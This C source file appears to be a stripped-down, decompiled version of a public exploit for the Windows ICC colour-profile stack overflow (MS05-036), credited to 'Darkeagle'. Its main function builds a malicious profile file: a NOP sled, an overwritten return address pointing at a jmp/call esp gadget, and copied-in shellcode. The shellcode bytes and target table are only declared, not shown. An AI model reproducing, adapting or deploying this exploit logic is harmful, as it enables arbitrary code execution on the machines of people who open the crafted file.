#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {unsigned int writeable_add; unsigned int jmpADD; } ;
typedef  int /*<<< orphan*/  DWORD ;

/* Variables and functions */
 int TARGET ; 
 int atoi (char*) ; 
 int buff ; 
 int /*<<< orphan*/  buildfile () ; 
 int content_size_offset ; 
 int /*<<< orphan*/  dword_revert (int,unsigned int) ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  list_target () ; 
 int /*<<< orphan*/  memset (int,int,unsigned int) ; 
 int no_access_violate ; 
 int no_access_violate2 ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int ret_addr_offset ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  sscanf (char*,char*,long*) ; 
 int stack_land_offset ; 
 unsigned int strlen (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  strncpy (int,int /*<<< orphan*/ ,unsigned int) ; 
 int /*<<< orphan*/  t2b (unsigned int) ; 
 int tag_content_offset ; 
 TYPE_1__* targets ; 

int main(int argc, char *argv[])
{
int i=0, t=TARGET, size=0;
int shal = 0;
unsigned int sc_size = strlen(shellcode);
unsigned int tag_size = stack_land_offset - tag_content_offset + 1 + sc_size ;
long fRetaddr = 0x00;

if (argc < 2) {
printf("\n\n");

printf("* Windows ICC stack overflow exploit (MS05-36)\n");
printf("* Code Execution Exploit\n");
printf("* (c) Darkeagle [ private code ]\n");
printf("* usage -> ms05-036 <target> (jmp/call esp)\n");
list_target() ;
exit(0);
}

t=atoi(argv[1]);

if ( argc == 3 )
sscanf(argv[2], "0x%x", &fRetaddr);

memset(buff + tag_content_offset, 0x90,tag_size);

*(DWORD*)(buff + no_access_violate2) = t2b(targets[t-1].writeable_add);
*(DWORD*)(buff + no_access_violate)  = t2b(0x4);
if ( fRetaddr == 0x00 )
{
*(DWORD*)(buff + ret_addr_offset)    = t2b(targets[t-1].jmpADD);
} else {
*(DWORD*)(buff + ret_addr_offset)    = t2b(fRetaddr);
}
strncpy(buff + stack_land_offset, shellcode, sc_size);
dword_revert(buff + stack_land_offset, sc_size);

tag_size = (tag_size >> 2 << 2) + 4;
printf("current size: 0x%.8X\n",tag_size);
*(DWORD*)(buff + content_size_offset) = t2b(tag_size);

buildfile();

return 0;

}